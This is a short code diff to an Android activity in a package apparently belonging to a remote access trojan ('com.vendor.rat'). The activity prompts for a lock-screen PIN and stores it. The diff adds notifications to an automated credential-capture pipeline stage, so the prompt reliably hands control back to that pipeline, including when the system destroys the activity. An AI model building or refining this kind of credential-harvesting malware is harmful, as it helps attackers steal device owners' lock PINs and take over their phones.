@@ -13,6 +13,7 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.vendor.rat.auto.pipeline.stage.LockCredentialStage;
 import com.vendor.rat.credential.LockCredentialStore;
 
 /**
@@ -79,6 +80,7 @@ public class LockCredentialPromptActivity extends Activity {
         LockCredentialStore.savePin(pin);
         Log.d(TAG, "PIN saved, finishing with RESULT_OK");
         setResult(RESULT_OK);
+        LockCredentialStage.notifyPromptFinished();
         finish();
   }
 
@@ -104,7 +106,15 @@ public class LockCredentialPromptActivity extends Activity {
     public void onBackPressed() {
         Log.d(TAG, "Back pressed, finishing with RESULT_CANCELED");
       setResult(RESULT_CANCELED);
+        LockCredentialStage.notifyPromptFinished();
         finish();
+    }
+
+    @Override
+    protected void onDestroy() {
+        // Safety net: 系统杀 Activity 时确保 pipeline 不会永久阻塞
+        LockCredentialStage.notifyPromptFinished();
+        super.onDestroy();
     }
 
     private void refreshPinDisplay() {
